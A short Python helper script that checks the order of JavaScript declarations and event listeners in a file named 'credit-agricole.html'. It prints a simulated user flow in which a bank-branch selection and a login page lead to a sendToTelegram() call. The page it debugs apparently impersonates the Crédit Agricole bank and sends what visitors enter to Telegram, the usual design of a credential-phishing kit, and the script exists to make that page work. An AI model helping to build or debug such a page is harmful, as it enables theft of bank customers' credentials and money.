with open('credit-agricole.html', 'r', encoding='utf-8') as f:
    content = f.read()

lines = content.split('\n')

caisseSelect_line = None
connectBtn_line = None
connectBtn_decl_line = None

for i, line in enumerate(lines):
    if 'const caisseSelect = document.getElementById' in line:
        caisseSelect_line = i
        print(f"Ligne {i}: const caisseSelect DECLARE")
    
    if 'const connectBtn = document.getElementById' in line:
        connectBtn_decl_line = i
        print(f"Ligne {i}: const connectBtn DECLARE")
    
    if 'connectBtn.addEventListener' in line:
        connectBtn_line = i
        print(f"Ligne {i}: connectBtn.addEventListener")

print("\n=== ORDRE D'EXECUTION ===")
if caisseSelect_line and connectBtn_decl_line and connectBtn_line:
    if caisseSelect_line < connectBtn_decl_line < connectBtn_line:
        print("OK: Order correct")
        print("\nSimulation du flux:")
        print("1. Page charge, caisseSelect = element du DOM")
        print("2. connectBtn = element du DOM")
        print("3. addEventListener enregistre la fonction")
        print("4. Utilisateur selectionne une caisse")
        print("5. Utilisateur clique connectBtn")
        print("6. selectedCaisseValue = caisseSelect.value")
        print("7. goToLoginPage() - cache searchPage")
        print("8. sendToTelegram() utilise selectedCaisseValue")
        print("\nCA DEVRAIT MARCHER!")
    else:
        print("ERREUR: Mauvais ordre")

